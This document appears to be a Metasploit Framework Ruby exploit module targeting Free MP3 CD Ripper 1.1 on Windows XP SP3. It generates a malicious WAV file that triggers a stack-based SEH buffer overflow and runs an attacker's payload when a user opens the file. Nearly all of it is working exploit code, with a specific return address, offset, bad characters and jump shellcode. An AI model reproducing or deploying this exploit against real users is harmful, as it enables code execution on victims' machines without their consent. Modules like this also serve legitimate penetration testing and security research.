# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Free MP3 CD Ripper 1.1 (WAV File) Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack based buffer overflow found in Free MP3 CD
                Ripper 1.1.  The overflow is triggered when an unsuspecting user opens a malicious
                WAV file.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Richard Leahy&#039;,    # Initial discovery
                    &#039;X-h4ck&#039;,           # msf module is based on his poc
                    &#039;Tiago Henriques&#039;,  # msf module
                    &#039;James Fitts&#039;       # clean ups
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDG&#039;, &#039;63349&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/11975&#039; ], #Initial disclosure
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17727/&#039; ] #This exploit is based on this poc
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;DisableNops&#039; => &#039;True&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3 EN&#039;,
                        {
                            &#039;Ret&#039; => 0x1001860b, # p/p/r in libFLAC.dll
                            &#039;Offset&#039; => 4116
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Aug 27 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.wav&#039;]),
            ], self.class)
    end
 
    def exploit
 
        wav = Metasm::Shellcode.assemble(Metasm::Ia32.new, "inc ecx").encode_string * 100
        wav << payload.encoded
        wav << rand_text_alpha_upper(target[&#039;Offset&#039;] - (100 + payload.encoded.length))
        wav << generate_seh_record(target.ret)
        wav << Metasm::Shellcode.assemble(Metasm::Ia32.new, "inc ecx").encode_string * 4
        wav << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-4050").encode_string
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(wav)
 
    end
 
end



